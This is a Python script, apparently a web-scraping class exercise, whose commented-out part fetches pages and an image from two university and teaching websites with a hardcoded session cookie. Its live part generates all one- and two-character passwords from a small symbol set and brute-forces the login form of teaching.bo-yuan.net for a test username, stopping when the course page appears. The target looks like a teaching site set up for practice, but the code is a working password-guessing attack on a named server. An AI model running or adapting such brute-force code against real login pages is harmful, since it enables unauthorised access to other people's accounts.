import requests
import codecs
# r1=requests.get(
# 	"https://www.ntub.edu.tw/",
# 	headers={
# 		"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0"
# 	},
# 	params={},
# 	data={},
# 	json={}
# )


# print(r1.status_code)
# print(r1.headers)
# for k,v in r1.headers.items():
# 	print(k,"=",v)

# r1.encoding="utf-8"
# print(r1.encoding)
# print(r1.text)
# with codecs.open("2020-11-18.html","w","utf8") as f:
# 	f.write(r1.text)

# r1=requests.get(
# 	"https://www.ntub.edu.tw/var/file/0/1000/randimg/mobileadv_5399_245808_09577.jpg",
# 	headers={
# 		"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0"
# 	},
# 	params={},
# 	data={},
# 	json={}
# )
# with codecs.open("2020-11-18.jpg","wb") as f:
# 	f.write(r1.content)

# r1=requests.post(
# 	"https://www.ntub.edu.tw/app/index.php?Action=mobileloadmod&Type=mobile_asso_cg_mstr&Nbr=1003",
# 	headers={
# 		"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0"
# 	},
# 	params={},
# 	data={},
# 	json={}
# )
# print(r1.text)

# r1=requests.get(
# 	"http://teaching.bo-yuan.net/",
# 	headers={
# 		"Cookie":"PHPSESSID=0kqleid9trt4f45befoua8lts3",
# 		"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0"
# 	},
# 	params={},
# 	data={},
# 	json={}
# )
# r1.encoding="utf8"
# print(r1.encoding)
# # print(r1.text)
# with codecs.open("2020-11-18.html","w","utf8") as f:
# 	f.write(r1.text)
pList=["a","b","c","d","e","1","2","3","4","5","6","7","8","9","0"]
passwdList=[]
def createPasswd(a=2,v=""):
	global passwdList
	for d in pList:
		passwdList+=[v+d]
		if a>1:
			createPasswd(a-1,v+d)

createPasswd(2,"")

for p in passwdList:
	r1=requests.post(
		"http://teaching.bo-yuan.net/",
		headers={
			"Cookie":"PHPSESSID=0kqleid9trt4f45befoua8lts3",
			"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0"
		},
		params={
			"uid":"5fb4c4971ab0c"
		},
		data={
			"ex[class]":"5f9d7897cfa59",
			"ex[username]":"99測試",
			"ex[password]":p
		}
	)
	r2=requests.get(
		"http://teaching.bo-yuan.net/",
		headers={
			"Cookie":"PHPSESSID=0kqleid9trt4f45befoua8lts3",
			"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0"
		}
	)

	r2.encoding="utf8"
	if "課程內容" in r2.text:
		print("密碼是：",p)
		break
# print(r1.encoding)
# print(r1.text)
# with codecs.open("2020-11-18.html","w","utf8") as f:
# 	f.write(r1.text)